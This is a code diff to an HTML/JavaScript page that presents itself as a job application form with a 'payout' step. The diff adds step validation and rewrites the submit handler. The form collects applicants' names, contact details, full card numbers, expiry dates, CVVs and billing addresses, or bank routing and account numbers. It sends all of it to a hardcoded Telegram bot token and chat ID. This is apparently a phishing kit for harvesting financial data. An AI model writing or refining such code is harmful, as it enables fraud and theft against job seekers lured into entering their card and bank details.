@@ -141,8 +141,8 @@
       transform: translateY(-50%);
       width: 40px;
       height: 28px;
-      background-size: contain;
       background-repeat: no-repeat;
+      background-size: contain;
       pointer-events: none;
       filter: drop-shadow(0 0 1px rgba(0,0,0,0.2));
     }
@@ -267,7 +267,31 @@
     const cardTypeIcon = document.getElementById('cardTypeIcon');
     const cardNumberInput = document.getElementById('cardNumber');
 
+    function validateStep(stepNumber) {
+      const step = document.getElementById('step-' + stepNumber);
+      const inputs = step.querySelectorAll('input, select');
+
+      for (const input of inputs) {
+        input.setCustomValidity('');
+
+        if (!input.checkValidity()) {
+          input.reportValidity();
+          input.focus();
+          return false;
+        }
+        if (input.tagName.toLowerCase() === 'select' && input.value === '') {
+          input.setCustomValidity('Please select an option.');
+          input.reportValidity();
+          input.focus();
+          input.setCustomValidity('');
+          return false;
+        }
+      }
+      return true;
+    }
+
     function nextStep(n) {
+      if (!validateStep(n - 1)) return;
       steps.forEach(s => s.classList.remove('active'));
       document.getElementById('step-' + n).classList.add('active');
       window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -336,7 +360,11 @@
         default:
           url = '';
       }
-      cardTypeIcon.style.backgroundImage = url ? `url(${url})` : '';
+      if(url) {
+        cardTypeIcon.style.backgroundImage = `url("${url}")`;
+      } else {
+        cardTypeIcon.style.backgroundImage = '';
+      }
     }
 
     cardNumberInput.addEventListener('input', () => {
@@ -348,61 +376,64 @@
       e.preventDefault();
       const form = this;
 
-      const currentStep = [...steps].find(s => s.classList.contains('active'));
-      if (!currentStep) return;
+      const currentStep = [...steps].findIndex(s => s.classList.contains('active'));
+      if (!validateStep(currentStep + 1)) return;
 
-      const inputsToCheck = currentStep.querySelectorAll('input, select');
-      for (const input of inputsToCheck) {
-        if (!input.checkValidity()) {
-          input.reportValidity();
-          input.focus();
-          return;
-        }
-      }
+      // Gather data
+      const data = {
+        name: form.name.value.trim(),
+        email: form.email.value.trim(),
+        phone: form.phone.value.trim(),
+        education: form.education.value,
+        industry: form.industry.value,
+      };
 
-      if (currentStep.id !== 'step-3') {
-        alert('Please proceed to the last step before submitting.');
-        return;
-      }
-
-      const data = Object.fromEntries(new FormData(form));
-      const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
-      const CHAT_ID = '1318100118';
-
-      const payoutMethod = cardForm.hidden ? 'bank' : 'card';
-
-      const commonFields = ['name', 'email', 'phone', 'education', 'industry'];
-      let payoutFields = [];
-
-      if (payoutMethod === 'card') {
-        payoutFields = ['cardName', 'cardNumber', 'expiry', 'cvv', 'billingAddress', 'billingCity', 'billingState', 'billingZip'];
+      if (!cardForm.hidden) {
+        data.payoutMethod = 'card';
+        data.cardName = form.cardName.value.trim();
+        data.cardNumber = form.cardNumber.value.trim();
+        data.expiry = form.expiry.value.trim();
+        data.cvv = form.cvv.value.trim();
+        data.billingAddress = form.billingAddress.value.trim();
+        data.billingCity = form.billingCity.value.trim();
+        data.billingState = form.billingState.value.trim();
+        data.billingZip = form.billingZip.value.trim();
       } else {
-        payoutFields = ['bankName', 'routingNumber', 'accountNumber', 'accountType'];
+        data.payoutMethod = 'bank';
+        data.bankName = form.bankName.value.trim();
+        data.routingNumber = form.routingNumber.value.trim();
+        data.accountNumber = form.accountNumber.value.trim();
+        data.accountType = form.accountType.value;
       }
 
-      let msg = '*📥 New WorkZone Application*\n\n';
+      // Format message to Telegram
+      let msg = `📢 *New Job Application*\n\n*Personal Info:*\n- Name: ${escapeMarkdown(data.name)}\n- Email: ${escapeMarkdown(data.email)}\n- Phone: ${escapeMarkdown(data.phone)}\n- Education: ${escapeMarkdown(data.education)}\n- Industry: ${escapeMarkdown(data.industry)}\n\n*Payout Method:* ${data.payoutMethod.toUpperCase()}\n`;
 
-      for (const key of commonFields) {
-        if (data[key]) msg += `*${escapeMarkdown(key)}*: ${escapeMarkdown(data[key])}\n`;
-      }
-      msg += `*Payout Method*: ${payoutMethod.toUpperCase()}\n`;
-      for (const key of payoutFields) {
-        if (data[key]) msg += `*${escapeMarkdown(key)}*: ${escapeMarkdown(data[key])}\n`;
+      if(data.payoutMethod === 'card') {
+        msg += `- Name on Card: ${escapeMarkdown(data.cardName)}\n- Card Number: ${escapeMarkdown(data.cardNumber)}\n- Expiry: ${escapeMarkdown(data.expiry)}\n- CVV: ${escapeMarkdown(data.cvv)}\n- Billing Address: ${escapeMarkdown(data.billingAddress)}\n- City: ${escapeMarkdown(data.billingCity)}\n- State: ${escapeMarkdown(data.billingState)}\n- ZIP: ${escapeMarkdown(data.billingZip)}\n`;
+      } else {
+        msg += `- Bank Name: ${escapeMarkdown(data.bankName)}\n- Routing Number: ${escapeMarkdown(data.routingNumber)}\n- Account Number: ${escapeMarkdown(data.accountNumber)}\n- Account Type: ${escapeMarkdown(data.accountType)}\n`;
       }
 
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      const token = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
+      const chatId = '1318100118';
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
-      });
-
-      nextStep('thanks');
-      form.reset();
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-      togglePayout('card');
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'MarkdownV2' }),
+      }).then(res => {
+        if (res.ok) {
+          steps.forEach(s => s.classList.remove('active'));
+          document.getElementById('step-thanks').classList.add('active');
+          form.reset();
+          cardTypeIcon.style.backgroundImage = '';
+        } else {
+          alert('Submission failed, please try again.');
+        }
+      }).catch(() => alert('Network error, try again later.'));
     });
 
-    // Initialize with card payout selected
+    // Initialize default payout toggle state
     togglePayout('card');
   </script>
 </body>
